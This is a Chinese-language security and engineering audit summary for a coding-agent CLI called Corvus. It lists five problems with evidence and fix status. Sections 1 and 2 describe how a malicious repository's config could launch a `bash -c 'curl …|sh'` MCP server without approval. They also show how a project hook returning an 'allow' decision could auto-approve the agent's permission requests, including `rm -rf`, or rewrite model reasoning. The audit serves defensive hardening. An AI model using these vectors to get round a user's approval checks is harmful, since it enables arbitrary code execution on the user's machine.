# Corvus 五大核心问题（快速参考）

> 来源：`DEEP_DIVE_CODEX_COMPARISON.md`（2026-08-10 深度对标报告，5 个子代理 + 本地核验）
> 用途：优先处理清单。每条含严重度、证据、修复方向。

## 修复状态（2026-08-10 已修复）

1. ✅ 项目级 MCP 免审批启动 → **已修复**：`pluginSpecFromEntryWithOptions` 对项目来源
   设置 `RequireLaunchApproval=true, Authorized=false`；boot 连接前经
   `ResolveStoredAuthorization` + 可注入 `MCPLaunchApprover`（非交互 fail-closed），
   批准走 `AuthorizeProjectSpecLaunch` 持久化授权，拒绝记录 `RequiresLaunchApproval`
   失败。遗留：`/mcp connect` 显式命令路径仍直连（用户显式操作，可接受）。
2. ✅ 项目 hooks 可代答权限 → **已修复**：项目 scope 的 Claude-format
   PermissionRequest hook 的 allow 决策被忽略（正常弹审批），deny 保留；global/plugin
   scope 行为不变。
3. ✅ lint/复杂度门禁失效、34 处死代码 → **已修复**：删除 31 处死代码（约 430 行，
   cli.go 的废弃 provider-family UI 含 API key 路径 `configureKeys`/`appendEnv` 已删），
   `golangci-lint .golangci.yml` 0 issues、staticcheck 0 条；新增 `.github/workflows/ci.yml`
   （build/vet/gofmt/test/race/lint 硬门 + 复杂度 report-only 趋势）。遗留：复杂度配置
   仍是 report-only（89 条基线，等拆 God file 后收紧）。
4. ✅ 两个 P1 并发隐患 → **已修复**：jobs 完成 Notice 移至 `close(j.done)` 之后；
   `/compact /new /clear` 接入 controller 生命周期（bgCtx/bgWG，Close 等待 15s 上限）；
   事件投递非阻塞化（`eventSink`/`syncSink`，Approval/Ask 不丢弃）；
   `MutationBarrier.EnterWriteCtx` 可取消；workspacelease 超时 + 泄漏告警。
5. ✅ 仓库卫生 → **部分修复**：`.gitignore` 补 `tmp/`；重建 `corvus.example.toml`；
   `--help` 三语补 `--max-steps`/`--allowedTools`；corvus-guide 技能改为真实诊断方式；
   gofmt 遗留文件。遗留（需你决策）：48 个已删除跟踪文件未提交/还原、`spike-shimmer`
   去留、**轮换 `.corvus/config.toml` 里的真实 API key**。

验收：`go build` / `go vet` / `go test ./...`（62 包 0 失败）/ `-race` 核心包 /
`golangci-lint` / `staticcheck` 全部通过。

---

## 1. 【高危】项目级 MCP server 无审批自动启动 = 任意代码执行

恶意仓库在 `.corvus/config.toml` 或根目录 `.mcp.json` 声明 `type="stdio"` 的 server
（如 `command="/bin/bash", args=["-c","curl …|sh"]`），会话启动即执行，无审批弹窗、
无沙箱，其 tools 还进入注册表供模型调用。

- 证据：`internal/config/config.go:1138-1148` `UserAuthorized()` 对
  `MCPSourceProjectConfig`/`MCPSourceProjectMCPJSON` 直接返回 `true`；
  `internal/boot/boot.go:2443` 用它标记 `Authorized`；`internal/boot/boot.go:2511`
  默认 `ProcessMode = MCPProcessHost`（无 OS 沙箱）；
  `internal/plugin/transport_stdio.go:99` 以用户权限直接拉起进程。
- 失效防护：为防这一点设计的 `RequireLaunchApproval`（`internal/mcplaunch/launch.go:24-41`、
  `internal/plugin/launcher_lock.go:35-44`）**全仓库无任何生产路径置为 `true`**
  （仅 `internal/plugin/plugin.go:1118` 拷贝传递；`internal/boot/boot.go:562` 因此恒走
  `Authorized=true` 分支）。
- 修复：项目级 MCP 默认要求交互式启动审批（复用 mcplaunch 摘要），或强制 confined
  沙箱 + 关网络；至少把 `RequireLaunchApproval` 接到项目来源分支。

## 2. 【高危】项目 hooks 无条件加载，且可代答权限

恶意仓库放 `.corvus/settings.json`：PermissionRequest hook 输出
`{"decision":{"behavior":"allow"}}` 即自动放行之后所有权限请求（含 `rm -rf`、写文件）；
UserPromptSubmit/PreToolUse/PostLLMCall hook 可跑任意 shell、改写模型推理。

- 证据：`internal/boot/boot.go:766` `hook.Load(ProjectRoot: root)` 无信任门
  （`internal/hook/hook.go:4-6` 注释声称 "only when the project is trusted" 但无对应代码）；
  `internal/hook/hook.go:1448` 命令 `sh -c` 执行；`internal/hook/hook.go:1049-1056`
  `claudeJSONAllow` 自动放行，exit 2 即拒绝。
- 修复：项目 hooks 与项目 MCP 一样需要显式信任/审批（首启提示 + 记录指纹）；
  PermissionRequest 钩子默认只允许全局来源，项目来源禁止代答。

## 3. 【工程】lint/复杂度门禁形同虚设，34 处死代码积压

`internal/cli` 有 34 处 staticcheck U1000 死代码（`.golangci.yml:5` 已启用 `unused`），
**仓库当前无法通过自己的 lint 配置**——说明 lint/CI 从未真正生效。其中
`configureKeys`/`appendEnv`（`internal/cli/cli.go:1233/1288`）是 API key 处理路径，
保留极易被误用（已核验全仓库无调用者）。复杂度配置 `.golangci-agent-complexity.yml`
为 report-only（`issues-exit-code: 0`），实测全仓 40+ 函数超 30 圈复杂度
（`boot.go:187` cc=269、`chat_tui.go:1114` cc=243）。

- 修复：删除死代码（约 600+ 行）；复杂度门禁以 `over 40` 起步接入 CI 硬门；
  落地 GitHub Actions（`make lint vet test` + `go test -race ./internal/...`）。

## 4. 【并发】两个 P1 死锁/生命周期隐患

- **job 完成通知阻塞 Emit 先于 `close(j.done)`**（"turn 等后台作业、后台作业等 turn"
  死锁环）：`internal/jobs/jobs.go:496-511` 在 `close(j.done)` 之前调用
  `recordCompletion`（`jobs.go:774` 阻塞 `sink.Emit(Notice)`）。TUI 消费者停摆 → 通道满 →
  `close(j.done)` 永不执行 → turn 的 `wait` 无限挂起，且 `event.Sync`
  （`internal/event/sync.go:20-25`）互斥锁被占导致所有 emitter 停摆。
  修复：完成 Notice 的 Emit 移到 `close(j.done)` 之后或非阻塞发送。
- **`/compact` `/new` `/clear` 裸 goroutine 可越过 `Close()`**：
  `internal/control/controller.go:1179-1203` 用 `context.Background()` 起 goroutine，
  无上限/无取消/无等待；`beginRotation`（`controller.go:1760-1772`）不检查 `closed`。
  迟到的 `/new` 可在 lease 已释放（`internal/cli/cli.go:402-405`）后换 session、
  触发 hooks、`SnapshotRewrite` 写盘，绕过所有权语义、可能触发虚假 recovery fork。
  修复：controller 级 WaitGroup + 派生 ctx（Close 时 cancel+Wait），`beginRotation`
  补 `closed` 检查。

## 5. 【仓库卫生】未提交删除 + 文档漂移 + 残留物

- **48 个已跟踪文件在工作区被删除未提交**（docs 全部 44 个 + `.env.example`、
  `PROJECT.md`、`corvus.example.toml`、`opencode.md`），另有 51 个 internal 文件修改，
  总计 105 项变更 +727/−16551——HEAD 与工作区严重漂移，尽快提交或还原，避免丢失。
- **README / 示例配置 / `--help` 三处失真**：README（`README.md:20`、
  `README.zh-CN.md:19`）引用已删除的 `corvus.example.toml`；帮助模板
  （`internal/i18n/messages_en.go:499`）遗漏已注册的 `--max-steps`（`cli.go:299`）与
  `--allowedTools` 别名（`cli.go:313`）。
- **内置技能引用不存在的命令**：`internal/skill/builtincontent/corvus-guide/SKILL.md:16`
  把 `corvus doctor capabilities` 当首要诊断命令，但 CLI 只有 `help/version` + flags；
  `corvus setup`/`corvus doctor` 仅存在于注释/错误信息（`internal/boot/resolver.go:102`）。
- **`tmp/` 未忽略**：`.gitignore` 只有 `temp/`，实际目录是 `tmp/`（含
  `google_crawler.py`、`__pycache__`、`snake/` 等实验残留），持续污染 `git status`。
- **`cmd/spike-shimmer` 已提交进主仓库**（A/B 试验脚本）。
- **本机 `.corvus/config.toml` 含真实 API key**：已 gitignore 非仓库泄露，但**建议轮换**。

---

## 建议处理顺序

1. 修 #1、#2（安全洞，阻塞性）
2. 修 #4 的两个 P1（稳定性）
3. 处理 #5（卫生，半小时内可完成）
4. 执行 #3（减重 + 门禁落地，配合拆 God file）
